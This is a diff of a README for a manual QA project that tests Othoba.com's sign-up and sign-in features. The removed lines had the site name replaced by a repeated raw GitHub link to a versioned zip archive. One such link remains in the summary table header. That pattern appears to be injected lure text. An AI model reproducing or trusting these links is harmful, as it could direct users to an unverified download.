@@ -2,7 +2,7 @@
 
 - Introduction
 - Summary
-- Test Case Works for https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip
+- Test Case Works for Othoba.com
   - Test Plan
   - Mind Map
   - Report
@@ -12,11 +12,11 @@
 
  # Introduction 
  This document provides a detailed overview of the processes involved in creating Test Cases, Test Case Reports, Bug Reports, Test Metrics, and Mind Maps for the 'https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip' website.
- The tasks are done for sign-up and sign-in features for [https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip] https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip
+ The tasks are done for sign-up and sign-in features for Othoba.com
 
  # Summary
 
-Below is a summary of all the tasks completed for https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip, presented in a tabular format.
+Below is a summary of all the tasks completed for Othoba.com, presented in a tabular format.
 
 | https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip |  
 | :-------------------------- |
@@ -28,8 +28,6 @@ Below is a summary of all the tasks completed for https://raw.githubusercontent.
 | Test metrics                |
 | Mind Map                    |
 
-
-# Test Case for https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Testing_Manual_com_Test_Case_Othoba_v1.8.zip
 
 ### Test Plan
 
